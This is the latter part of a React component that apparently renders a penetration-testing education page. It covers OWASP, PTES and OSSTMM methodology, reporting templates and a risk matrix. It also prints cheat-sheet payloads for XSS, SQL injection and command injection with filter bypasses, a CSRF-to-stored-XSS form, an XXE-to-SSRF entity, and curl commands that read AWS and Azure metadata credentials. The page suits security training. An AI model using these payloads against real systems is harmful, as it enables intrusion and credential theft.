                          <div>&lt;script&gt;alert`XSS`&lt;/script&gt;</div>
                          <div>&lt;script&gt;alert('XS'+'S')&lt;/script&gt;</div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">SQL Injection Mastery</h4>
                    <div className="space-y-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Union-based Injection</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>' UNION SELECT 1,2,3,4,5--</div>
                          <div>' UNION ALL SELECT NULL,NULL,NULL--</div>
                          <div>' UNION SELECT @@version,NULL,NULL--</div>
                          <div>' UNION SELECT user(),database(),version()--</div>
                        </div>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Time-based Blind Injection</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>'; WAITFOR DELAY '00:00:05'--</div>
                          <div>' AND SLEEP(5)--</div>
                          <div>'; SELECT pg_sleep(5)--</div>
                          <div>' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))--</div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Command Injection Techniques</h4>
                    <div className="space-y-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Basic Command Injection</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>; ls -la</div>
                          <div>| whoami</div>
                          <div>& id</div>
                          <div>&& cat /etc/passwd</div>
                          <div>|| uname -a</div>
                          <div>`whoami`</div>
                          <div>$(whoami)</div>
                        </div>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Advanced Bypass Techniques</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>; w'h'o'a'm'i</div>
                          <div>; who$IFS$()ami</div>
                          <div>; who${'{'}IFS{'}'}ami</div>
                          <div>; wh''oami</div>
                          <div>; echo "d2hvYW1p" | base64 -d | sh</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Terminal className="h-5 w-5" />
                  Advanced Exploitation Chains
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Multi-step Attack Scenarios</h4>
                    <Accordion type="single" collapsible className="w-full">
                      <AccordionItem value="csrf-xss-chain">
                        <AccordionTrigger>CSRF + Stored XSS Chain</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <p className="text-sm">Use CSRF to inject XSS payload into application</p>
                            <ol className="text-sm space-y-2 list-decimal list-inside">
                              <li>Identify CSRF vulnerability in comment/profile update</li>
                              <li>Craft CSRF form that submits XSS payload</li>
                              <li>Host malicious page with auto-submitting form</li>
                              <li>Social engineer victim to visit malicious page</li>
                              <li>CSRF executes, injecting persistent XSS</li>
                              <li>XSS executes on subsequent page loads</li>
                            </ol>
                            <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs">
                              <div>&lt;form action="http://target.com/profile" method="POST"&gt;</div>
                              <div>&nbsp;&nbsp;&lt;input name="bio" value="&lt;script&gt;/* XSS payload */&lt;/script&gt;"&gt;</div>
                              <div>&lt;/form&gt;</div>
                              <div>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</div>
                            </div>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                      <AccordionItem value="idor-privilege-escalation">
                        <AccordionTrigger>IDOR + Privilege Escalation</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <p className="text-sm">Combine IDOR with privilege escalation for admin access</p>
                            <ol className="text-sm space-y-2 list-decimal list-inside">
                              <li>Discover IDOR in user profile endpoints</li>
                              <li>Enumerate to find admin user IDs</li>
                              <li>Access admin profile data</li>
                              <li>Extract admin session tokens or API keys</li>
                              <li>Use admin credentials for full compromise</li>
                              <li>Maintain persistence through backdoors</li>
                            </ol>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                      <AccordionItem value="xxe-ssrf-chain">
                        <AccordionTrigger>XXE + SSRF Internal Network Access</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <p className="text-sm">Use XXE to perform SSRF and access internal networks</p>
                            <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                              <div>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div>
                              <div>&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;]&gt;</div>
                              <div>&lt;root&gt;&xxe;&lt;/root&gt;</div>
                            </div>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                    </Accordion>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Post-Exploitation Techniques</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Persistence Mechanisms</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>Web shell upload</li>
                          <li>Backdoor user accounts</li>
                          <li>Scheduled tasks/cron jobs</li>
                          <li>Database triggers</li>
                          <li>Configuration file modifications</li>
                        </ul>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Data Exfiltration</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>DNS exfiltration</li>
                          <li>HTTP-based data theft</li>
                          <li>Blind SQL injection extraction</li>
                          <li>Covert channels</li>
                          <li>Steganography methods</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Privilege Escalation Paths</h4>
                    <div className="space-y-3">
                      <ul className="space-y-2 text-sm">
                        <li><strong>Horizontal Escalation:</strong> Access other users' data at same privilege level</li>
                        <li><strong>Vertical Escalation:</strong> Gain higher privileges (user to admin)</li>
                        <li><strong>Container Escape:</strong> Break out of containerized environments</li>
                        <li><strong>Cloud Privilege Escalation:</strong> AWS/Azure/GCP role assumption</li>
                        <li><strong>Database Privilege Escalation:</strong> Gain DBA or system privileges</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Methodology Tab */}
        <TabsContent value="methodology" className="mt-6">
          <div className="grid gap-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <FileSearch className="h-5 w-5" />
                  OWASP Testing Guide Implementation
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Information Gathering (WSTG-INFO)</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Reconnaissance Tasks</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>WSTG-INFO-01: Search Engine Discovery</li>
                          <li>WSTG-INFO-02: Fingerprint Web Server</li>
                          <li>WSTG-INFO-03: Review Webserver Metafiles</li>
                          <li>WSTG-INFO-04: Enumerate Applications</li>
                          <li>WSTG-INFO-05: Review Webpage Content</li>
                        </ul>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Analysis Tasks</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>WSTG-INFO-06: Identify Entry Points</li>
                          <li>WSTG-INFO-07: Map Execution Paths</li>
                          <li>WSTG-INFO-08: Fingerprint Framework</li>
                          <li>WSTG-INFO-09: Fingerprint Application</li>
                          <li>WSTG-INFO-10: Map Architecture</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Configuration Management (WSTG-CONFIG)</h4>
                    <Accordion type="single" collapsible className="w-full">
                      <AccordionItem value="config-network">
                        <AccordionTrigger>Network Infrastructure Configuration</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <ul className="text-sm space-y-1">
                              <li>• Network segmentation analysis</li>
                              <li>• Firewall rule assessment</li>
                              <li>• Load balancer configuration</li>
                              <li>• CDN settings review</li>
                            </ul>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                      <AccordionItem value="config-platform">
                        <AccordionTrigger>Application Platform Configuration</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <ul className="text-sm space-y-1">
                              <li>• Web server hardening verification</li>
                              <li>• Application server security settings</li>
                              <li>• Database configuration review</li>
                              <li>• Operating system security baseline</li>
                            </ul>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                    </Accordion>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Identity Management Testing</h4>
                    <div className="space-y-3">
                      <p className="text-sm">Comprehensive testing of authentication and authorization mechanisms</p>
                      <div className="grid md:grid-cols-3 gap-4">
                        <div>
                          <Badge variant="outline" className="mb-2 text-xs">Authentication</Badge>
                          <ul className="space-y-1 text-xs">
                            <li>Credential transport</li>
                            <li>Password policy</li>
                            <li>Account lockout</li>
                            <li>Multi-factor auth</li>
                          </ul>
                        </div>
                        <div>
                          <Badge variant="outline" className="mb-2 text-xs">Authorization</Badge>
                          <ul className="space-y-1 text-xs">
                            <li>Path traversal</li>
                            <li>Privilege escalation</li>
                            <li>IDOR testing</li>
                            <li>Role-based access</li>
                          </ul>
                        </div>
                        <div>
                          <Badge variant="outline" className="mb-2 text-xs">Session Management</Badge>
                          <ul className="space-y-1 text-xs">
                            <li>Session fixation</li>
                            <li>Session timeout</li>
                            <li>Token analysis</li>
                            <li>Logout functionality</li>
                          </ul>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Shield className="h-5 w-5" />
                  PTES (Penetration Testing Execution Standard)
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">PTES Methodology Phases</h4>
                    <div className="space-y-4">
                      <div className="border-l-4 border-cybr-primary pl-4">
                        <h5 className="font-medium mb-2">Phase 1: Pre-engagement</h5>
                        <ul className="text-sm space-y-1">
                          <li>• Scoping discussions and target definition</li>
                          <li>• Rules of engagement documentation</li>
                          <li>• Timeline establishment and resource allocation</li>
                          <li>• Legal documentation and liability agreements</li>
                        </ul>
                      </div>
                      <div className="border-l-4 border-cybr-primary pl-4">
                        <h5 className="font-medium mb-2">Phase 2: Intelligence Gathering</h5>
                        <ul className="text-sm space-y-1">
                          <li>• OSINT collection and target identification</li>
                          <li>• Footprinting and network mapping</li>
                          <li>• Social engineering preparation</li>
                          <li>• Physical security assessment</li>
                        </ul>
                      </div>
                      <div className="border-l-4 border-cybr-primary pl-4">
                        <h5 className="font-medium mb-2">Phase 3: Threat Modeling</h5>
                        <ul className="text-sm space-y-1">
                          <li>• Attack surface analysis</li>
                          <li>• Threat actor profiling</li>
                          <li>• Business impact assessment</li>
                          <li>• Attack vector prioritization</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Technical Testing Phases</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Vulnerability Analysis</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>Automated vulnerability scanning</li>
                          <li>Manual testing and validation</li>
                          <li>False positive elimination</li>
                          <li>Exploitation feasibility assessment</li>
                        </ul>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Exploitation</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>Initial compromise and foothold</li>
                          <li>Privilege escalation techniques</li>
                          <li>Lateral movement and persistence</li>
                          <li>Data collection and exfiltration</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Reporting Framework</h4>
                    <div className="space-y-3">
                      <div className="bg-gray-50 p-4 rounded-lg">
                        <h5 className="font-medium mb-2">Executive Summary Template</h5>
                        <div className="text-sm space-y-1">
                          <div>• Assessment overview and methodology</div>
                          <div>• Key findings summary with risk ratings</div>
                          <div>• Business impact assessment</div>
                          <div>• Strategic recommendations</div>
                        </div>
                      </div>
                      <div className="bg-gray-50 p-4 rounded-lg">
                        <h5 className="font-medium mb-2">Technical Findings Format</h5>
                        <div className="text-sm space-y-1">
                          <div>• Vulnerability details and CVSS scoring</div>
                          <div>• Proof-of-concept demonstrations</div>
                          <div>• Remediation recommendations</div>
                          <div>• Risk prioritization matrix</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <AlertTriangle className="h-5 w-5" />
                  OSSTMM (Open Source Security Testing Methodology)
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Scientific Testing Approach</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Core Concepts</Badge>
                        <ul className="space-y-1 text-sm">
                          <li><strong>Porosity:</strong> System openness measurement</li>
                          <li><strong>Limitations:</strong> Security control boundaries</li>
                          <li><strong>Controls:</strong> Protective mechanisms</li>
                          <li><strong>Trust:</strong> Relationship verification</li>
                          <li><strong>Visibility:</strong> Information exposure</li>
                        </ul>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Testing Channels</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>Human Security Testing</li>
                          <li>Physical Security Testing</li>
                          <li>Wireless Security Testing</li>
                          <li>Telecommunications Testing</li>
                          <li>Data Network Security Testing</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Data Network Security Channel</h4>
                    <div className="space-y-3">
                      <p className="text-sm">Comprehensive testing of network-based security controls and data protection mechanisms</p>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Network Architecture:</strong> Segmentation analysis, routing security, trust boundaries</li>
                        <li><strong>Protocol Security:</strong> TCP/IP stack testing, routing protocol security, network service analysis</li>
                        <li><strong>Network Device Security:</strong> Router, switch, and firewall configuration assessment</li>
                        <li><strong>Intrusion Detection:</strong> IDS/IPS effectiveness testing, evasion technique validation</li>
                      </ul>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Metrics and Measurement</h4>
                    <div className="space-y-3">
                      <p className="text-sm">OSSTMM emphasizes quantifiable security metrics for reproducible results</p>
                      <div className="bg-gray-50 p-4 rounded-lg">
                        <h5 className="font-medium mb-2">Security Metrics</h5>
                        <ul className="text-sm space-y-1">
                          <li>• Operational Security (OpSec) score</li>
                          <li>• Threat assessment quantification</li>
                          <li>• Control effectiveness measurement</li>
                          <li>• Risk analysis with statistical backing</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Advanced Tab */}
        <TabsContent value="advanced" className="mt-6">
          <div className="grid gap-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Zap className="h-5 w-5" />
                  Cloud Security Testing
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">AWS Security Assessment</h4>
                    <div className="space-y-4">
                      <div>
                        <Badge variant="outline" className="mb-2">S3 Bucket Security</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div># S3 Bucket enumeration</div>
                          <div>aws s3 ls s3://company-name</div>
                          <div>aws s3 ls s3://company-backup</div>
                          <div>bucket_finder.rb wordlist.txt</div>
                          <div>slurp domain company.com</div>
                        </div>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">EC2 Metadata Service</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>curl http://169.254.169.254/latest/meta-data/</div>
                          <div>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</div>
                          <div>curl http://169.254.169.254/latest/user-data/</div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Azure Security Testing</h4>
                    <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                      <div># Azure metadata service</div>
                      <div>curl -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2017-08-01</div>
                      <div>curl -H "Metadata:true" http://169.254.169.254/metadata/identity/oauth2/token</div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Cloud Security Tools</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <ul className="space-y-1 text-sm">
                          <li><strong>ScoutSuite:</strong> Multi-cloud security auditing</li>
                          <li><strong>Prowler:</strong> AWS security assessment</li>
                          <li><strong>CloudMapper:</strong> AWS environment visualization</li>
                          <li><strong>Pacu:</strong> AWS exploitation framework</li>
                        </ul>
                      </div>
                      <div>
                        <ul className="space-y-1 text-sm">
                          <li><strong>Cloud_enum:</strong> Multi-cloud enumeration</li>
                          <li><strong>S3Scanner:</strong> S3 bucket assessment</li>
                          <li><strong>WeirdAAL:</strong> AWS attack library</li>
                          <li><strong>ROADtools:</strong> Azure AD reconnaissance</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Network className="h-5 w-5" />
                  Modern Web Security Challenges
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">GraphQL Security Testing</h4>
                    <div className="space-y-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Introspection Attacks</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>query IntrospectionQuery {'{'}  </div>
                          <div>  __schema {'{'}  </div>
                          <div>    queryType {'{'} name {'}'}</div>
                          <div>    mutationType {'{'} name {'}'}</div>
                          <div>    types {'{'}  </div>
                          <div>      name</div>
                          <div>      fields {'{'} name type {'{'} name {'}'} {'}'}</div>
                          <div>    {'}'}</div>
                          <div>  {'}'}</div>
                          <div>{'}'}</div>
                        </div>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Resource Exhaustion</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>query {'{'}  </div>
                          <div>  user(id: "1") {'{'}  </div>
                          <div>    posts {'{'}  </div>
                          <div>      comments {'{'}  </div>
                          <div>        author {'{'}  </div>
                          <div>          posts {'{'} # Recursive depth attack</div>
                          <div>            comments {'{'} ... {'}'}</div>
                          <div>          {'}'}</div>
                          <div>        {'}'}</div>
                          <div>      {'}'}</div>
                          <div>    {'}'}</div>
                          <div>  {'}'}</div>
                          <div>{'}'}</div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">WebSocket Security Testing</h4>
                    <div className="space-y-3">
                      <ul className="space-y-2 text-sm">
                        <li><strong>Connection Hijacking:</strong> Session manipulation and authentication bypass</li>
                        <li><strong>Message Injection:</strong> Protocol manipulation and command injection</li>
                        <li><strong>Cross-site WebSocket Hijacking:</strong> CSRF in WebSocket connections</li>
                        <li><strong>Denial of Service:</strong> Connection flooding and resource exhaustion</li>
                      </ul>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Progressive Web App (PWA) Security</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Service Worker Attacks</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>Cache poisoning attacks</li>
                          <li>Request interception</li>
                          <li>Background sync abuse</li>
                          <li>Push notification hijacking</li>
                        </ul>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Manifest Exploitation</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>App spoofing attacks</li>
                          <li>Icon replacement</li>
                          <li>URL scheme hijacking</li>
                          <li>Permission escalation</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Code className="h-5 w-5" />
                  Professional Reporting & Documentation
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Executive Summary Template</h4>
                    <div className="bg-gray-50 p-4 rounded-lg space-y-3">
                      <div>
                        <h5 className="font-medium mb-2">Assessment Overview</h5>
                        <ul className="text-sm space-y-1">
                          <li>• Client information and assessment period</li>
                          <li>• Assessment type and methodology used</li>
                          <li>• Scope definition and testing boundaries</li>
                          <li>• Key stakeholder information</li>
                        </ul>
                      </div>
                      <div>
                        <h5 className="font-medium mb-2">Risk Summary</h5>
                        <ul className="text-sm space-y-1">
                          <li>• Critical/High/Medium/Low finding counts</li>
                          <li>• Business impact assessment</li>
                          <li>• Compliance implications</li>
                          <li>• Immediate action items</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Technical Finding Format</h4>
                    <div className="bg-gray-50 p-4 rounded-lg space-y-3">
                      <div className="text-sm">
                        <div className="font-medium mb-1">Vulnerability Details:</div>
                        <div>• Vulnerability type and affected components</div>
                        <div>• CVSS score and risk rating</div>
                        <div>• Discovery method and validation</div>
                      </div>
                      <div className="text-sm">
                        <div className="font-medium mb-1">Impact Analysis:</div>
                        <div>• Technical impact (CIA triad)</div>
                        <div>• Business impact assessment</div>
                        <div>• Potential attack scenarios</div>
                      </div>
                      <div className="text-sm">
                        <div className="font-medium mb-1">Remediation:</div>
                        <div>• Immediate mitigation steps</div>
                        <div>• Long-term security improvements</div>
                        <div>• Verification procedures</div>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Risk Assessment Matrix</h4>
                    <div className="overflow-x-auto">
                      <table className="w-full text-sm border-collapse border">
                        <thead>
                          <tr className="bg-gray-100">
                            <th className="border p-2 text-left">Impact</th>
                            <th className="border p-2">Low</th>
                            <th className="border p-2">Medium</th>
                            <th className="border p-2">High</th>
                            <th className="border p-2">Critical</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr>
                            <td className="border p-2 font-medium">High</td>
                            <td className="border p-2 bg-yellow-100">Medium</td>
                            <td className="border p-2 bg-orange-100">High</td>
                            <td className="border p-2 bg-red-100">Critical</td>
                            <td className="border p-2 bg-red-200">Critical</td>
                          </tr>
                          <tr>
                            <td className="border p-2 font-medium">Medium</td>
                            <td className="border p-2 bg-green-100">Low</td>
                            <td className="border p-2 bg-yellow-100">Medium</td>
                            <td className="border p-2 bg-orange-100">High</td>
                            <td className="border p-2 bg-red-100">Critical</td>
                          </tr>
                          <tr>
                            <td className="border p-2 font-medium">Low</td>
                            <td className="border p-2 bg-green-100">Low</td>
                            <td className="border p-2 bg-green-100">Low</td>
                            <td className="border p-2 bg-yellow-100">Medium</td>
                            <td className="border p-2 bg-orange-100">High</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default TestingTechniquesSection;
